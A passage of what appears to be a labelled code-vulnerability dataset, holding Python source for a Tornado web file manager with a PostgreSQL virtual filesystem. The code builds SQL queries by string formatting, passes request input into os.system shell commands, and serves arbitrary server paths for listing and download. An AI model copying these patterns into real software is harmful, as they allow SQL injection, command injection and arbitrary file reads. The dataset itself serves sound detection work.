str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n\n################################################################################\n\nclass FilesUploadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self, target_path, file_name):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def save_file_async(alter_ego, target_path, file_name):\n            upload_data = alter_ego.request.body\n            target_path = decode_hexed_b64_to_str(target_path)\n            # Committing changes to database\n            db.Filesystem.mkfile(target_path, file_name, 'user', upload_data)\n            # Final return\n            future.set_result('bzs_upload_success')\n        tornado.ioloop.IOLoop.instance().add_callback(save_file_async,\n            self, target_path, file_name)\n\n        response_temp = yield future\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(response_temp)))\n        self.write(response_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n/n/n/n", "label": 0}, {"id": "fa76c130ed80b9f5636cab41e88054536205c376", "code": "/bzs/db.py/n/n\nimport binascii\nimport copy\nimport datetime\nimport hashlib\nimport psycopg2\nimport pytz\nimport time\nimport uuid\n\nfrom bzs import const\n\ndef get_current_time():\n    \"\"\"Gets the current time, in float since epoch.\"\"\"\n    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))\n    return float(time.time())\n\ndef get_new_uuid(uuid_, uuid_list=None):\n    \"\"\"Creates a new UUID that is not in 'uuid_list' if given.\"\"\"\n    if not uuid_:\n        uuid_ = uuid.uuid4().hex\n        if type(uuid_list) in [set, dict]:\n            while uuid_ in uuid_list:\n                uuid_ = uuid.uuid4().hex\n    return uuid_\n\n################################################################################\n\nclass DatabaseType:\n    def __init__(self):\n        self.connect_params = dict(\n            database=const.get_const('db-name'),\n            user=const.get_const('db-user'),\n            password=const.get_const('db-password'),\n            host=const.get_const('db-host-addr'),\n            port=const.get_const('db-host-port')\n        )\n        self._db = psycopg2.connect(**self.connect_params)\n        self._cur = None\n        return\n\n    def execute(self, command, **args):\n        self._cur = self._db.cursor()\n        try:\n            self._cur.execute(command, **args)\n            final_arr = self._cur.fetchall()\n        except psycopg2.ProgrammingError:\n            # We'll take this as granted... though risky.\n            final_arr = None\n        self._db.commit()\n        self._cur.close()\n        return final_arr\n\n    def init_db(self):\n        # Purge database of obsolete tables\n        self.execute(\"\"\"\n            DROP TABLE core;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE users;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_system;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_storage;\n        \"\"\")\n        # Creating new tables in order to function\n        self.execute(\"\"\"\n            CREATE TABLE core (\n                index   TEXT,\n                data    BYTEA\n            );\n            CREATE TABLE users (\n                handle          TEXT,\n                password        TEXT,\n                usergroups      TEXT,\n                ip_address      TEXT[],\n                events          TEXT[],\n                usr_name        TEXT,\n                usr_description TEXT,\n                usr_email       TEXT,\n                usr_followers   TEXT[],\n                usr_friends     TEXT[]\n            );\n            CREATE TABLE file_system(\n                uuid        TEXT,\n                file_name   TEXT,\n                owner       TEXT,\n                upload_time DOUBLE PRECISION,\n                sub_folders TEXT[],\n                sub_files   TEXT[][]\n            );\n            CREATE TABLE file_storage (\n                uuid    TEXT,\n                size    BIGINT,\n                count   BIGINT,\n                hash    TEXT,\n                content BYTEA\n            );\n        \"\"\")\n        return\n    pass\n\nDatabase = DatabaseType()\n\n################################################################################\n\nclass FileStorageType:\n    st_uuid_idx = dict()\n    st_hash_idx = dict()\n    # Database entry\n    st_db = Database\n    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512\n    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers\n    hash_algo = hashlib.sha256\n\n    class UniqueFile:\n        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):\n            self.master = master\n            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)\n            self.master.st_uuid_idx[self.uuid] = self\n            self.size = size\n            self.count = count # The number of references\n            self.hash = hash_ # Either way... must specify this!\n            self.master.st_hash_idx[self.hash] = self\n            # Will not contain content, would be indexed in SQL.\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sql(db)\n\n    def load_sql(self, db=Database):\n        \"\"\"Loads index of all stored UniqueFiles in database.\"\"\"\n        self.st_db = db\n        for item in self.st_db.execute(\"SELECT uuid, size, count, hash FROM file_storage;\"):\n            s_uuid, s_size, s_count, s_hash = item\n            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)\n            # Inject into indexer\n            self.st_uuid_idx[s_uuid] = s_fl\n            self.st_hash_idx[s_hash] = s_fl\n        return\n\n    def new_unique_file(self, content):\n        \"\"\"Creates a UniqueFile, and returns its UUID in string.\"\"\"\n        n_uuid = get_new_uuid(None, self.st_uuid_idx)\n        n_size = len(content)\n        n_count = 1\n        n_hash = self.hash_algo(content).hexdigest()\n        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)\n        # Done indexing, now proceeding to process content into SQL\n        content = binascii.hexlify(content).decode('ascii')\n        # self.st_db.execute('INSERT INTO file_storage (uuid, size, count, hash, content) VALUES (\"%s\", %d, %d, \"%s\", E\"\\\\\\\\x%s\");' % (n_uuid, n_size, n_count, n_hash, content))\n        self.st_db.execute(\"INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\\\x%s');\" % (n_uuid, n_size, n_count, n_hash, content))\n        # Injecting file into main indexer\n        self.st_uuid_idx[n_uuid] = u_fl\n        self.st_hash_idx[n_hash] = u_fl\n        return n_uuid\n\n    def get_content(self, uuid_):\n        try:\n            u_fl = self.st_uuid_idx[uuid_]\n        except Exception:\n            return b''\n        # Got file handle, now querying file data\n        content = self.st_db.execute(\"SELECT content FROM file_storage WHERE uuid = '%d';\" % uuid_)\n        return content\n    pass\n\nFileStorage = FileStorageType()\n\n################################################################################\n\nclass FilesystemType:\n    \"\"\"This is a virtual filesystem based on a relational PostgreSQL database.\n    We might call it a SQLFS. Its tree-topological structure enables it to index\n    files and find siblings quickly. Yet without the B-Tree optimization it would\n    not be easy to maintain a high performance.\n    \"\"\"\n    fs_uuid_idx = dict()\n    fs_root = None\n    fs_db = None\n\n    class fsNode:\n        \"\"\"This is a virtual node on a virtual filesystem SQLFS. The virtual node contains\n        the following data:\n\n            uuid        - The unique identifier: if node is a directory, then this uuid\n                          would be the identifier pointing to the directory; if node is\n                          a file, this identifier would be pointing to the UUID among\n                          the actual files instead of the filesystem.\n            is_dir      - Whether is a directory or not\n            filename    - The actual file / directory name given by the user\n            upload_time - The time uploaded / copied / moved to server\n            f_uuid      - If a file them this indicates its FileStorage UUID.\n\n        Other data designed to maintain the structure of the node includes:\n\n            master        - The filesystem itself.\n            sub_folder    - Removed after filesystem init, temporary use only.\n            sub_files     - Removed after filesystem init, temporary use only.\n            sub_items     - Set of children.\n            sub_names_idx - Contains same data as sub_items, but indexed by name.\n\n        Do process with caution, and use exported methods only.\n        \"\"\"\n\n        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):\n            # The filesystem / master of the node\n            self.master = master\n            # Assigning data\n            self.is_dir = is_dir\n            self.file_name = file_name\n            self.owner = owner\n            # Generate Universally Unique Identifier\n            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)\n            master.fs_uuid_idx[self.uuid] = self\n            # Get upload time\n            self.upload_time = upload_time or get_current_time()\n            if not self.is_dir:\n                self.sub_folders = set()\n                self.sub_files = set()\n                self.f_uuid = f_uuid\n            else:\n                # Folder initialization needs to be accounted after init as whole by the main caller\n                self.sub_folders = sub_folders # Temporary\n                self.sub_files = sub_files # Temporary\n            # This is a traversal thing...\n            self.parent = None\n            self.sub_items = set()\n            self.sub_names_idx = dict()\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sqlfs(db)\n\n    def load_sqlfs(self, db=Database):\n        self.fs_db = db\n        for item in self.fs_db.execute(\"SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system\"):\n            # Splitting tuple into parts\n            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item\n            # Getting sub files which are expensive stored separately\n            n_sub_files = set()\n            for fil_idx in sub_files:\n                # This is where the order goes, BEAWARE\n                s_uuid = fil_idx[0]\n                s_file_name = fil_idx[1]\n                s_owner = fil_idx[2]\n                try:\n                    s_upload_time = float(fil_idx[3])\n                except:\n                    s_upload_time = get_current_time()\n                s_f_uuid = fil_idx[4]\n                # Pushing...\n                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)\n                n_sub_files.add(s_file)\n                self.fs_uuid_idx[s_uuid] = s_file\n            # Getting sub folders as a set but not templating them\n            n_sub_folders = set() # Since reference is passed, should not manipulate this further\n            for fol_idx in sub_folders:\n                n_sub_folders.add(fol_idx)\n            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)\n            self.fs_uuid_idx[uuid_] = fold_elem\n        # Done importing from SQL database, now attempting to refurbish connexions\n        for uuid_ in self.fs_uuid_idx:\n            item = self.fs_uuid_idx[uuid_]\n            if not item.is_dir:\n                continue\n            # Asserted that it was a folder.\n            for n_sub in item.sub_files:\n                item.sub_items.add(n_sub)\n                item.sub_names_idx[n_sub.file_name] = n_sub\n            for n_sub_uuid in item.sub_folders:\n                try:\n                    n_sub = self.fs_uuid_idx[n_sub_uuid]\n                    item.sub_items.add(n_sub)\n                    item.sub_names_idx[n_sub.file_name] = n_sub\n                except Exception:\n                    pass\n            del item.sub_files\n            del item.sub_folders\n        # Fixing parental occlusions\n        def iterate_fsnode(node):\n            for item in node.sub_items:\n                if item.parent:\n                    continue\n                # Never iterated before\n                item.parent = node\n                iterate_fsnode(item)\n            return\n        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...\n            item = self.fs_uuid_idx[uuid_]\n            iterate_fsnode(item)\n        # Finding root and finishing parent connexions\n        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me\n            item = self.fs_uuid_idx[uuid_]\n            while item.parent:\n                item = item.parent\n            self.fs_root = item\n            break\n        else:\n            self.make_root()\n        # Traversing root for filename indexing\n        def iterate_node_fn(node):\n            for item in node.sub_items:\n                node.sub_names_idx[item.file_name]\n        # All done, finished initialization\n        return\n\n    def make_root(self):\n        item = self.fsNode(True, '', 'System', master=self)\n        del item.sub_files\n        del item.sub_folders\n        item.sub_items = set()\n        item.parent = None\n        # Done generation, inserting.\n        self.fs_root = item\n        self.fs_uuid_idx[item.uuid] = item\n        # Inserting to SQL.\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');\" % (item.uuid, item.file_name, item.owner, item.upload_time))\n        return\n\n    def locate(self, path, parent=None):\n        \"\"\"Locate the fsNode() of the location 'path'. If 'parent' is given and\n        as it should be a fsNode(), the function look to the nodes directly\n        under this, non-recursively.\"\"\"\n        # On the case it is a referring location, path should be str.\n        if parent:\n            try:\n                item = parent.sub_names_idx[path]\n            except Exception:\n                return None\n            return item\n        # And it is not such a location.\n        # We assert that path should be list().\n        if type(path) == str:\n            path = path.split('/')\n            while '' in path:\n                path.remove('')\n        # Now got array, traversing...\n        item = self.fs_root\n        while path:\n            try:\n                item = item.sub_names_idx[path[0]]\n            except Exception:\n                return None # This object does not exist.\n            path = path[1:]\n        return item\n\n    def _sqlify_fsnode(self, item):\n        n_uuid = item.uuid\n        n_file_name = item.file_name\n        n_owner = item.owner\n        n_upload_time = item.upload_time\n        n_sub_folders = list()\n        n_sub_files = list()\n        for i_sub in item.sub_items:\n            if i_sub.is_dir:\n                n_sub_folders.append(\"\\\"%s\\\"\" % i_sub.uuid)\n            else:\n                s_attr = \"{%s, %s, %s, %s, %s}\" % (\n                    \"\\\"%s\\\"\" % i_sub.uuid,\n                    \"\\\"%s\\\"\" % i_sub.file_name,\n                    \"\\\"%s\\\"\" % i_sub.owner,\n                    \"\\\"%f\\\"\" % i_sub.upload_time,\n                    \"\\\"%s\\\"\" % i_sub.f_uuid\n                )\n                n_sub_files.append(s_attr)\n        # Formatting string\n        n_sub_folders_str = \"'{\" + \", \".join(i for i in n_sub_folders) + \"}'\"\n        n_sub_files_str = \"'{\" + \", \".join(i for i in n_sub_files) + \"}'\"\n        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)\n\n    def _update_in_db(self, item):\n        # This applies to items in the\n        # We assert that item should be Node.\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return False\n        # Giving a few but crucial assertions...\n        if not item.is_dir:\n            item = item.parent\n            if not item.is_dir:\n                return False # I should raise, by a matter of fact\n        # Collecting data\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        command = \"UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';\" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)\n        self.fs_db.execute(command)\n        return True\n\n    def _insert_in_db(self, item):\n        \"\"\"Create filesystem record of directory 'item' inside database.\"\"\"\n        if not item.is_dir:\n            return False # Must be directory...\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);\" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))\n        return\n\n    def get_content(self, item):\n        \"\"\"Gets binary content of the object (must be file) and returns the actual\n        content in bytes.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return b''\n        if item.is_dir:\n            return b''\n        return FileStorage.get_content(item.f_uuid)\n\n    def _remove_recursive(self, item):\n        \"\"\"Removes content of a single object and recursively call all its\n        children for recursive removal.\"\"\"\n        # We assert item is fsNode().\n        # Remove recursively.\n        for i_sub in item.sub_items:\n            self._remove_recursive(i_sub)\n        # Delete itself from filesystem.\n        del self.fs_uuid_idx[item.uuid]\n        # Delete itself from SQL database.\n        self.fs_db.execute(\"DELETE FROM file_system WHERE uuid = '%s';\" % item.uuid)\n        return\n\n    def remove(self, path):\n        \"\"\"Removes (recursively) all content of the folder / file itself and\n        all its subdirectories.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return False\n        # Done assertion, path is now fsNode().\n        par = path.parent\n        self._remove_recursive(path)\n        if par:\n            par.sub_items.remove(path)\n            del par.sub_names_idx[path.file_name]\n            self._update_in_db(par)\n        return True\n\n    def _copy_recursive(self, item, target_par, new_owner):\n        \"\"\"Copies content of a single object and recursively call all its\n        children for recursive copy, targeted as a child under target_par.\"\"\"\n        # We assert item, target_par are all fsNode().\n        target_node = target_par.sub_names_idx[item.file_name]\n        for i_sub in item.sub_items:\n            i_sub.parent = item\n            item.sub_names_idx[i_sub.file_name] = i_sub\n            self._copy_recursive(i_sub, target_node, new_owner)\n        # Insert into SQL database\n        item.uuid = get_new_uuid(None, self.fs_uuid_idx)\n        self.fs_uuid_idx[item.uuid] = item\n        item.upload_time = get_current_time()\n        if new_owner:\n            item.owner = new_owner # Assignment\n        if item.is_dir:\n            self._insert_in_db(item)\n        return\n\n    def copy(self, source, target_parent, new_owner=None):\n        \"\"\"Copies content of 'source' (recursively) and hang the target object\n        that was copied under the node 'target_parent'. If rename required please call\n        the related functions separatedly.\"\"\"\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not source or not target_parent:\n            return False\n        # Done assertion, now proceed with deep copy\n        target = copy.deepcopy(source)\n        target.parent = target_parent\n        target_parent.sub_items.add(target)\n        target_parent.sub_names_idx[target.file_name] = target\n        self._copy_recursive(target, target_parent, new_owner)\n        # Update target_parent data and return\n        self._update_in_db(target_parent)\n        return True\n\n    def move(self, source, target_parent):\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not source or not target_parent:\n            return False\n        # Moving an re-assigning tree structures\n        par = source.parent\n        par.sub_items.remove(source)\n        del par.sub_names_idx[source.file_name]\n        source.parent = target_parent\n        target_parent.sub_items.add(source)\n        target_parent.sub_names_idx[source.file_name] = source\n        # Updating SQL database.\n        self._update_in_db(par)\n        self._update_in_db(target_parent)\n        return\n\n    def rename(self, item, file_name):\n        \"\"\"Renames object 'item' into file_name.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        if item.parent:\n            del item.parent.sub_names_idx[item.file_name]\n            item.file_name = file_name\n            item.parent.sub_names_idx[item.file_name] = item\n        if item.is_dir:\n            self._update_in_db(item)\n        else:\n            self._update_in_db(item.parent)\n        return True\n\n    def chown(self, item, owner):\n        \"\"\"Assign owner of 'item' to new owner, recursively.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        def _chown_recursive(item_, owner_):\n            for sub_ in item_.sub_items:\n                _chown_recursive(sub_, owner_)\n            item_.owner = owner_\n            if item_.is_dir:\n                self._update_in_db(item_)\n            return\n        _chown_recursive(item, owner)\n        if not item.is_dir:\n            self._update_in_db(item.parent)\n        return True\n\n    def mkfile(self, path_parent, file_name, owner, content):\n        \"\"\"Inject object into filesystem, while passing in content. The content\n        itself would be indexed in FileStorage.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_uuid = FileStorage.new_unique_file(content)\n        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def mkdir(self, path_parent, file_name, owner):\n        \"\"\"Inject folder into filesystem.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_fl = self.fsNode(True, file_name, owner, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        self._insert_in_db(n_fl)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def listdir(self, path):\n        \"\"\"Creates a list of files in the directory 'path'. Attributes of the returned\n        result contains:\n\n            file-name   - File name\n            file-size   - File size\n            is-dir      - Whether is directory\n            owner       - The handle of the owner\n            upload-time - Time uploaded, in float since epoch.\n\n        The result should always be a list, and please index it with your own\n        habits or modify the code.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return []\n        # List directory, given the list(dict()) result...\n        dirs = list()\n        for item in path.sub_items:\n            attrib = dict()\n            # try:\n            attrib['file-name'] = item.file_name\n            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size\n            attrib['is-dir'] = item.is_dir\n            attrib['owner'] = item.owner\n            attrib['upload-time'] = item.upload_time\n            # except:\n            #     continue\n            dirs.append(attrib)\n        # Give the results to downstream\n        return dirs\n\n    def shell(self):\n        \"\"\"Interactive shell for manipulating SQLFS. May be integrated into other\n        utilites in the (far) futuure. Possible commands are:\n\n            ls             - List content of current directory.\n            cat name       - View binary content of the object 'name'.\n            cd             - Change CWD into the given directory, must be relative.\n                             or use '..' to go to parent directory.\n            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.\n            rename src nam - Rename file / folder 'src' to 'nam'.\n            mkdir name     - Make directory of 'name' under this directory.\n            mkfile name    - Make empty file of 'name' under this directory.\n            rm name        - Remove (recursively) object of 'name' under this directory.\n            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.\n            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.\n            q              - Exit shell.\n\n        Would be done in a infinite loop. Use 'q' to leave.\"\"\"\n        cwd = self.fs_root\n        cuser = 'system'\n        cwd_list = ['']\n        while True:\n            cwd_fl = ''.join((i + '/') for i in cwd_list)\n            print('root@postgres %s$ ' % cwd_fl, end='')\n            cmd_input = input()\n            cmd = cmd_input.split(' ')\n            op = cmd[0]\n            if op == 'ls':\n                res = self.listdir(cwd)\n                # Prettify the result\n                print('Owner       Upload Time         Size            Filename            ')\n                print('--------------------------------------------------------------------')\n                for item in res:\n                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))\n                print('Total: %d' % len(res))\n                print('')\n            elif op == 'cat':\n                dest = self.locate(cmd[1], parent=cwd)\n                print(self.get_content(dest))\n            elif op == 'cd':\n                if cmd[1] == '..':\n                    cwd_dest = cwd.parent\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list = cwd_list[:-1]\n                else:\n                    cwd_dest = cwd.sub_names_idx[cmd[1]]\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list.append(cmd[1])\n            elif op == 'chown':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.chown(dest, cmd[2])\n            elif op == 'rename':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.rename(dest, cmd[2])\n            elif op == 'mkdir':\n                self.mkdir(cwd, cmd[1], cuser)\n            elif op == 'mkfile':\n                self.mkfile(cwd, cmd[1], cuser, b'')\n            elif op == 'rm':\n                self.remove(self.locate(cmd[1], parent=cwd))\n            elif op == 'cp':\n                src = self.locate(cmd[1], parent=cwd)\n                self.copy(src, cmd[2])\n            elif op == 'mv':\n                src = self.locate(cmd[1], parent=cwd)\n                self.move(src, cmd[2])\n            elif op == 'q':\n                break\n            else:\n                print('Unknown command \"%s\".' % op)\n        return\n    pass\n\nFilesystem = FilesystemType()\n\n################################################################################\n/n/n/n/bzs/module_files.py/n/n\nimport base64\nimport binascii\nimport io\nimport json\nimport re\nimport time\nimport tornado\n\nfrom bzs import files\nfrom bzs import const\nfrom bzs import users\nfrom bzs import preproc\n\n# TODO: Remove this!\nimport os\n\ndef encode_str_to_hexed_b64(data):\n    return binascii.b2a_hex(base64.b64encode(data.encode('utf-8'))).decode('utf-8')\ndef decode_hexed_b64_to_str(data):\n    return base64.b64decode(binascii.unhexlify(data.encode('utf-8'))).decode('utf-8')\n\n################################################################################\n\nclass FilesListHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, target_path):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async(target_path):\n            # Getting file template.\n            file_temp = files.get_static_data('./static/files.html')\n\n            # Retrieving list target.\n            try:\n                target_path = decode_hexed_b64_to_str(target_path)\n            except:\n                target_path = '/'\n            if not target_path:\n                target_path = '/'\n\n            # Getting parental directorial list\n            files_hierarchy = target_path.split('/')\n            files_hierarchy_list = list()\n            while '' in files_hierarchy:\n                files_hierarchy.remove('')\n            files_hierarchy = [''] + files_hierarchy\n            files_hierarchy_cwd = ''\n            for i in range(0, len(files_hierarchy)):\n                files_hierarchy[i] += '/'\n                files_hierarchy_cwd += files_hierarchy[i]\n                files_hierarchy_list.append(dict(\n                    folder_name=files_hierarchy[i],\n                    href_path='/files/list/%s' % encode_str_to_hexed_b64(files_hierarchy_cwd),\n                    disabled=(i == len(files_hierarchy) - 1)))\n                continue\n\n            # Getting current directory content\n            files_attrib_list = list()\n            for file_name in os.listdir(target_path):\n                try: # In case of a permission error.\n                    actual_path = target_path + file_name\n                    attrib = dict()\n                    attrib['file-name'] = file_name\n                    attrib['allow-edit'] = True\n                    attrib['file-size'] = files.format_file_size(os.path.getsize(actual_path))\n                    attrib['owner'] = 'root'\n                    attrib['date-uploaded'] = time.ctime(os.path.getctime(actual_path))\n                    # Detecting whether is a folder\n                    if os.path.isdir(actual_path):\n                        attrib['mime-type'] = 'directory/folder'\n                    else:\n                        attrib['mime-type'] = files.guess_mime_type(file_name)\n                    # And access links should differ between folders and files\n                    if attrib['mime-type'] == 'directory/folder':\n                        attrib['target-link'] = '/files/list/%s' % encode_str_to_hexed_b64(actual_path + '/')\n                    else:\n                        attrib['target-link'] = '/files/download/%s/%s' % (encode_str_to_hexed_b64(actual_path), file_name)\n                    attrib['uuid'] = encode_str_to_hexed_b64(actual_path)\n                    files_attrib_list.append(attrib)\n                except Exception:\n                    pass\n            cwd_uuid = encode_str_to_hexed_b64(files_hierarchy_cwd)\n\n            # File actually exists, sending data\n            working_user = users.get_user_by_cookie(\n                self.get_cookie('user_active_login', default=''))\n            file_temp = preproc.preprocess_webpage(file_temp, working_user,\n                files_attrib_list=files_attrib_list,\n                files_hierarchy_list=files_hierarchy_list,\n                cwd_uuid=cwd_uuid)\n            future.set_result(file_temp)\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async,\n            target_path)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesDownloadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, file_path, file_name):\n        # Something that I do not wish to write too many times..\n        def invoke_404():\n            self.set_status(404, \"Not Found\")\n            self._headers = tornado.httputil.HTTPHeaders()\n            self.add_header('Content-Length', '0')\n            self.flush()\n            return\n\n        # Get file location (exactly...)\n        try:\n            file_path = decode_hexed_b64_to_str(file_path)\n        except Exception:\n            file_path = ''\n        if not file_path:\n            invoke_404()\n            return\n\n        # File actually exists, sending data\n        try:\n            file_handle = open(file_path, 'rb')\n        except Exception:\n            invoke_404()\n            return\n        file_data = file_handle.read()\n        file_handle.close()\n        file_stream = io.BytesIO(file_data)\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'application/x-download')\n        self.add_header('Content-Length', str(len(file_data)))\n\n        # Asynchronous web request...\n        file_block_size = 64 * 1024 # 64 KiB / Chunk\n        file_block = bytes()\n\n        while file_stream.tell() < len(file_data):\n            byte_pos = file_stream.tell()\n            # Entry to the concurrency worker\n            future = tornado.concurrent.Future()\n            # Concurrent worker\n            def retrieve_data_async():\n                block = file_stream.read(file_block_size)\n                future.set_result(block)\n            # Injection and pending\n            tornado.ioloop.IOLoop.instance().add_callback(retrieve_data_async)\n            # Reset or read\n            file_block = yield future\n            self.write(file_block)\n            file_block = None\n            self.flush()\n        file_block = None\n        self.finish()\n\n        # Release memory...\n        file_stream = None\n        file_data = None\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesOperationHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async():\n            operation_content_raw = self.request.body\n            operation_content = json.loads(operation_content_raw.decode('utf-8', 'ignore'))\n            action = operation_content['action']\n            sources = operation_content['source']\n            if type(sources) == list:\n                for i in range(0, len(sources)):\n                    try:\n                        sources[i] = decode_hexed_b64_to_str(sources[i])\n                    except:\n                        pass\n            else:\n                sources = decode_hexed_b64_to_str(sources)\n            if action in ['copy', 'move']:\n                try:\n                    target = decode_hexed_b64_to_str(operation_content['target'])\n                except:\n                    target = '/'\n            elif action in ['rename', 'new-folder']:\n                try:\n                    target = operation_content['target']\n                except:\n                    target = sources # I am not handling more exceptions as this is brutal enough\n            # Done assigning values, now attempting to perform operation\n            if action == 'copy':\n                for source in sources:\n                    os.system('cp \"D:%s\" \"D:%s\"' % (source, target))\n            elif action == 'move':\n                for source in sources:\n                    os.system('mv \"D:%s\" \"D:%s\"' % (source, target))\n            elif action == 'delete':\n                for source in sources:\n                    os.system('rm \"D:%s\"' % source)\n            elif action == 'rename':\n                os.system('rename \"D:%s\" \"%s\"' % (sources, target))\n            elif action == 'new-folder':\n                os.system('mkdir \"D:%s%s\"' % (sources, target))\n            future.set_result('')\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n\n################################################################################\n\nclass FilesUploadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self, target_path, file_name):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def save_file_async(alter_ego, target_path, file_name):\n            upload_data = alter_ego.request.body\n            target_path = decode_hexed_b64_to_str(target_path)\n            # Attempting to write to file... otherwise might try to rename until\n            # File does not exist.\n            def get_non_duplicate_path(file_path):\n           